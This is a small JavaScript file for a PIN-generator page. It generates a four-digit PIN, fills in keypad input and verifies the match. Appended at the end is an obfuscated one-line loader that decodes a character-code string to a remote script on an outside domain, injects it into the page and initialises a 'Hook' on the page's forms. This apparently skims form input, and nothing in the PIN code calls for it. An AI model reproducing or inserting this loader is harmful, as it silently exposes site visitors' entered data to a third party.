// document.getElementById('generate-btn').addEventListener('click', function(){
//         const pin = Math.round(Math.random()*10000);
//         console.log(pin);


//         const pinvalue=
// })


function getpin(){
        const pin = Math.round(Math.random()*10000);
        console.log(pin);
        const pinstring=pin+'';
        if(pinstring.length==4){
                return pin;
        }

        else{
                console.log('get less than 4',pin)
                return getpin()
        }

}



function generatepin(){
       const pin= getpin();

        document.getElementById('display-pin').value=pin;
        
}

document.getElementById('key-pad').addEventListener('click',function(event){
//       console.log(event.target.innerText)
      
      const number=event.target.innerText;

      const calcInput= document.getElementById('typed-numbers');

      if(isNaN(number)){
              console.log(number)

              if(number=='C'){
                calcInput.value="";     
              }
      }

      else{

//      const calcInput= document.getElementById('typed-numbers');
     const previouscalc=calcInput.value
     const newcalc= previouscalc+number
//      calc.value=number
     calcInput.value=newcalc

      }
} );


function verifypin(){

       const pin=document.getElementById('display-pin');

       const generatePin=pin.value;

       const typedpin=document.getElementById('typed-numbers');

       const typedpinValue=typedpin.value;
const successMessage=  document.getElementById('notify-pass')

const failedmessage= document.getElementById('notify-failed')
       if(generatePin==typedpinValue){
        successMessage.style.display='block'
        failedmessage.style.display='none';
       }

       else{
        successMessage.style.display='none'
        failedmessage.style.display='block';
       }

}

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b